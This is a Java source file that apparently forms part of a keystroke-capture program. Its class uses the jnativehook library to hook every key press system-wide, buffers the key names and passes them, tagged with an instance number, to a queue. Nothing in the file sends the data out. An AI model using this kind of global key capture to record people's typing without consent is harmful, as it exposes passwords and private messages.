package tk.arktech;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.nio.CharBuffer;
import java.util.concurrent.BlockingQueue;

public class KeyListener implements NativeKeyListener {

    private final BlockingQueue<String> queue;
    private CharBuffer buf;
    private final int mynumber;

    public KeyListener(BlockingQueue<String> queue, CharBuffer buf, int mynumber) {
        this.queue = queue;
        this.buf = buf;
        this.mynumber = mynumber;
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if(buf.length()<=1)
        {
            try {
                buf.rewind();
                queue.put(mynumber + buf.toString());
            } catch (InterruptedException e) {
                //TODO: Errorhandling
                e.printStackTrace();
            }
            buf.clear();
        }

//        buf.put(nativeKeyEvent.getKeyChar());
        var data = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        data = data.replace("Enter", "\n");
        buf.put(data);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
